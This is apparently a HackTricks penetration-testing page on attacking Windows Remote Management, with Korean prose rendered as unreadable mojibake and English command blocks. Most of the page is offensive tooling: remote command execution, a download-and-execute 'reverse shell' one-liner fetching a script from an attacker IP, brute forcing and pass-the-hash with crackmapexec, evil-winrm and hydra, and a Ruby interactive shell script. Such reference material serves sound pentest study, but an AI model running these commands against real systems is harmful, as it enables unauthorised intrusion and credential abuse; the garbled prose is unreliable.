# 5985,5986 - WinRM íœí…ŒìŠ¤íŒ…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **ë‹¹ì‹ ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.

</details>

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ ë§ì€ í•´ì»¤ ë° ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ë“¤ê³¼ ì†Œí†µí•˜ë ¤ë©´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ íƒêµ¬í•˜ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ ì‘ìš©í•˜ì„¸ìš”

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ì˜ ìµœì‹  ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ ìœ ì§€í•˜ì„¸ìš”

**ìµœì‹  ê³µì§€**\
ì¶œì‹œë˜ëŠ” ìµœì‹  ë²„ê·¸ ë°”ìš´í‹° ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ì•Œì•„ë‘ì„¸ìš”

**[**ë””ìŠ¤ì½”ë“œ**](https://discord.com/invite/N3FrSbmwdy)ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

## WinRM

[Windows ì›ê²© ê´€ë¦¬ (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx)ì€ **Microsoftì˜ í”„ë¡œí† ì½œ**ë¡œ, HTTP(S)ë¥¼ í†µí•´ **Windows ì‹œìŠ¤í…œì˜ ì›ê²© ê´€ë¦¬**ë¥¼ ê°€ëŠ¥ì¼€ í•˜ëŠ” ê²ƒìœ¼ë¡œ ê°•ì¡°ë©ë‹ˆë‹¤. ì´ëŠ” SOAPë¥¼ í™œìš©í•˜ë©° ê¸°ë³¸ì ìœ¼ë¡œ WMIì— ì˜í•´ êµ¬ë™ë˜ë©°, WMI ì‘ì—…ì„ ìœ„í•œ HTTP ê¸°ë°˜ ì¸í„°í˜ì´ìŠ¤ë¡œ ë‚˜íƒ€ë‚©ë‹ˆë‹¤.

ê¸°ê¸°ì— WinRMì´ ì¡´ì¬í•˜ë©´ PowerShellì„ í†µí•´ ê°„í¸í•œ ì›ê²© ê´€ë¦¬ê°€ ê°€ëŠ¥í•˜ë©°, ë‹¤ë¥¸ ìš´ì˜ ì²´ì œì—ì„œ SSHê°€ ì‘ë™í•˜ëŠ” ë°©ì‹ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤. WinRMì´ ì‘ë™ ì¤‘ì¸ì§€ í™•ì¸í•˜ë ¤ë©´ íŠ¹ì • í¬íŠ¸ê°€ ì—´ë ¤ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

ìœ„ ëª©ë¡ì—ì„œ í¬íŠ¸ê°€ ì—´ë ¤ ìˆë‹¤ë©´ WinRMì´ ì„¤ì •ë˜ì–´ ìˆìŒì„ ë‚˜íƒ€ë‚´ë©°, ë”°ë¼ì„œ ì›ê²© ì„¸ì…˜ì„ ì‹œì‘í•  ìˆ˜ ìˆëŠ” ì‹œë„ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.

### **WinRM ì„¸ì…˜ ì‹œì‘**

PowerShellì„ WinRMì— êµ¬ì„±í•˜ë ¤ë©´ Microsoftì˜ `Enable-PSRemoting` cmdletì„ ì‚¬ìš©í•˜ì—¬ ì»´í“¨í„°ë¥¼ ì›ê²© PowerShell ëª…ë ¹ì„ ìˆ˜ë½í•˜ë„ë¡ ì„¤ì •í•©ë‹ˆë‹¤. ìƒìœ„ ê¶Œí•œ PowerShell ì•¡ì„¸ìŠ¤ë¡œ ì´ ê¸°ëŠ¥ì„ í™œì„±í™”í•˜ê³  ì„ì˜ì˜ í˜¸ìŠ¤íŠ¸ë¥¼ ì‹ ë¢°í•  ìˆ˜ ìˆë„ë¡ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
ì´ ì ‘ê·¼ ë°©ì‹ì€ `trustedhosts` êµ¬ì„±ì— ì™€ì¼ë“œì¹´ë“œë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒì„ í¬í•¨í•˜ë©°, ê·¸ëŸ¬í•œ ì¡°ì¹˜ëŠ” ê·¸ ì˜í–¥ì„ ê³ ë ¤í•´ì•¼ í•˜ê¸° ë•Œë¬¸ì— ì‹ ì¤‘í•˜ê²Œ ê³ ë ¤í•´ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ, ê³µê²©ìì˜ ì»´í“¨í„°ì—ì„œ ë„¤íŠ¸ì›Œí¬ ìœ í˜•ì„ "ê³µìš©"ì—ì„œ "ì‘ì—…"ìœ¼ë¡œ ë³€ê²½í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, WinRMì€ `wmic` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ **ì›ê²©ìœ¼ë¡œ í™œì„±í™”**ë  ìˆ˜ ìˆìœ¼ë©°, ë‹¤ìŒê³¼ ê°™ì´ ì‹œì—°ë©ë‹ˆë‹¤:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ë©´ ì›ê²© WinRM ì„¤ì •ì´ ê°€ëŠ¥í•´ì ¸ ë©€ë¦¬ ë–¨ì–´ì§„ Windows ê¸°ê¸°ë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ê´€ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### êµ¬ì„± ì—¬ë¶€ í…ŒìŠ¤íŠ¸

ê³µê²© ê¸°ê¸°ì˜ ì„¤ì •ì„ í™•ì¸í•˜ë ¤ë©´ `Test-WSMan` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ëŒ€ìƒì´ WinRMì„ ì˜¬ë°”ë¥´ê²Œ êµ¬ì„±í–ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ í”„ë¡œí† ì½œ ë²„ì „ ë° wsmidì— ëŒ€í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ë°›ì•„ë“¤ì¼ ê²ƒìœ¼ë¡œ ì˜ˆìƒë˜ë©°, ì´ëŠ” ì„±ê³µì ì¸ êµ¬ì„±ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì•„ë˜ëŠ” êµ¬ì„±ëœ ëŒ€ìƒê³¼ êµ¬ì„±ë˜ì§€ ì•Šì€ ëŒ€ìƒì— ëŒ€í•œ ì˜ˆìƒ ì¶œë ¥ì„ ë³´ì—¬ì£¼ëŠ” ì˜ˆì‹œì…ë‹ˆë‹¤:

* ì˜¬ë°”ë¥´ê²Œ êµ¬ì„±ëœ ëŒ€ìƒì˜ ê²½ìš°, ì¶œë ¥ì€ ë‹¤ìŒê³¼ ìœ ì‚¬í•  ê²ƒì…ë‹ˆë‹¤:
```bash
Test-WSMan <target-ip>
```
### ëª…ë ¹ ì‹¤í–‰

ëŒ€ìƒ ì»´í“¨í„°ì—ì„œ ì›ê²©ìœ¼ë¡œ `ipconfig`ë¥¼ ì‹¤í–‰í•˜ê³  ì¶œë ¥ì„ ë³´ë ¤ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•˜ì‹­ì‹œì˜¤:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (151).png>)

ë‹¹ì‹ ì€ **Invoke-Command**ë¥¼ í†µí•´ í˜„ì¬ PS ì½˜ì†”ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë¡œì»¬ì— _enumeration_ì´ë¼ëŠ” í•¨ìˆ˜ê°€ ìˆê³  ì´ë¥¼ ì›ê²© ì»´í“¨í„°ì—ì„œ ì‹¤í–‰í•˜ê³  ì‹¶ë‹¤ê³  ê°€ì •í•´ë³´ì‹­ì‹œì˜¤:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### ì—­ì‰˜ íšë“
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PS ì„¸ì…˜ ê°€ì ¸ì˜¤ê¸°

ëŒ€í™”í˜• PowerShell ì…¸ì„ ê°€ì ¸ì˜¤ë ¤ë©´ `Enter-PSSession`ì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1009).png>)

**ì„¸ì…˜ì€ "í”¼í•´ì" ë‚´ë¶€ì˜ ìƒˆ í”„ë¡œì„¸ìŠ¤(wsmprovhost)ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.**

### **WinRM ê°•ì œ ì—´ê¸°**

PS Remoting ë° WinRMì„ ì‚¬ìš©í•˜ë ¤ë©´ ì»´í“¨í„°ê°€ êµ¬ì„±ë˜ì–´ ìˆì§€ ì•Šë”ë¼ë„ ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### ì„¸ì…˜ ì €ì¥ ë° ë³µì›

ë§Œì•½ ì›ê²© ì»´í“¨í„°ì—ì„œ ì–¸ì–´ê°€ ì œí•œë˜ì–´ ìˆë‹¤ë©´, ì´ ê¸°ëŠ¥ì€ **ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
ì´ ì„¸ì…˜ ë‚´ì—ì„œ _Invoke-Command_ì„ ì‚¬ìš©í•˜ì—¬ PS ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### ì˜¤ë¥˜

ë§Œì•½ ë‹¤ìŒ ì˜¤ë¥˜ë¥¼ ë°œê²¬í•œë‹¤ë©´:

`enter-pssession : ì›ê²© ì„œë²„ 10.10.10.175ì— ì—°ê²°í•˜ëŠ” ë° ë‹¤ìŒ ì˜¤ë¥˜ ë©”ì‹œì§€ë¡œ ì‹¤íŒ¨í–ˆìŠµë‹ˆë‹¤ : WinRM í´ë¼ì´ì–¸íŠ¸ê°€ ìš”ì²­ì„ ì²˜ë¦¬í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ì¸ì¦ ì²´ê³„ê°€ Kerberosì™€ ë‹¤ë¥¸ ê²½ìš° ë˜ëŠ” í´ë¼ì´ì–¸íŠ¸ ì»´í“¨í„°ê°€ ë„ë©”ì¸ì— ê°€ì…ë˜ì§€ ì•Šì€ ê²½ìš° HTTPS ì „ì†¡ì„ ì‚¬ìš©í•˜ê±°ë‚˜ ëŒ€ìƒ ì»´í“¨í„°ë¥¼ TrustedHosts êµ¬ì„± ì„¤ì •ì— ì¶”ê°€í•´ì•¼ í•©ë‹ˆë‹¤. TrustedHostsë¥¼ êµ¬ì„±í•˜ë ¤ë©´ winrm.cmdë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤. TrustedHosts ëª©ë¡ì— ìˆëŠ” ì»´í“¨í„°ëŠ” ì¸ì¦ë˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ê´€ë ¨ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ : winrm help config. ìì„¸í•œ ì •ë³´ëŠ” about_Remote_Troubleshooting ë„ì›€ë§ ì£¼ì œë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.`

í´ë¼ì´ì–¸íŠ¸ì—ì„œ ì‹œë„í•˜ì„¸ìš” ([ì—¬ê¸°](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)ì˜ ì •ë³´ë¥¼ ì°¸ê³ ):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì—¬ ê²½í—˜ä¸°å¯Œí•œ í•´ì»¤ë“¤ê³¼ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ë“¤ê³¼ ì†Œí†µí•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ì¦ê±°ì›€ê³¼ ë„ì „ì— ëŒ€í•´ íƒêµ¬í•˜ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ ì‘ìš©í•˜ì„¸ìš”

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ íŒŒì•…í•˜ì„¸ìš”

**ìµœì‹  ê³µì§€**\
ìµœì‹  ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”

**[Discord](https://discord.com/invite/N3FrSbmwdy)**ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

## ë¦¬ëˆ…ìŠ¤ì—ì„œì˜ WinRM ì—°ê²°

### ë¸Œë£¨íŠ¸ í¬ìŠ¤

ì¡°ì‹¬í•˜ì„¸ìš”, WinRM ë¸Œë£¨íŠ¸ í¬ì‹±ì€ ì‚¬ìš©ìë¥¼ ì°¨ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### ì•…ì˜ì ì¸-winrm ì‚¬ìš©í•˜ê¸°
```ruby
gem install evil-winrm
```
**ë¬¸ì„œ**ë¥¼ ì½ìœ¼ë ¤ë©´ í•´ë‹¹ githubë¥¼ ë°©ë¬¸í•˜ì„¸ìš”: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
### evil-winrmë¥¼ ì‚¬ìš©í•˜ì—¬ **IPv6 ì£¼ì†Œ**ì— ì—°ê²°í•˜ë ¤ë©´ _**/etc/hosts**_ ë‚´ì— **ë„ë©”ì¸ ì´ë¦„**ì„ IPv6 ì£¼ì†Œë¡œ ì„¤ì •í•˜ê³  í•´ë‹¹ ë„ë©”ì¸ì— ì—°ê²°í•˜ì‹­ì‹œì˜¤.

### evil-winrmë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ì‹œ ì „ë‹¬í•˜ê¸°
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (680).png>)

### PS ë„ì»¤ ë¨¸ì‹  ì‚¬ìš©í•˜ê¸°
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### ë£¨ë¹„ ìŠ¤í¬ë¦½íŠ¸ ì‚¬ìš©

**ì—¬ê¸°ì—ì„œ ì¶”ì¶œí•œ ì½”ë“œ:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## References

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks ìë™ ëª…ë ¹ì–´
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
â€‹

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì—¬ ê²½í—˜ä¸¨í•œ í•´ì»¤ë“¤ê³¼ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ë“¤ê³¼ ì†Œí†µí•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°**\
í•´í‚¹ì˜ ì¦ê±°ì›€ê³¼ ë„ì „ì— ëŒ€í•´ íƒêµ¬í•˜ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ì‘ìš©í•˜ì„¸ìš”

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ íŒŒì•…í•˜ì„¸ìš”

**ìµœì‹  ê³µì§€**\
ìµœì‹  ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”

**[Discord](https://discord.com/invite/N3FrSbmwdy)**ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
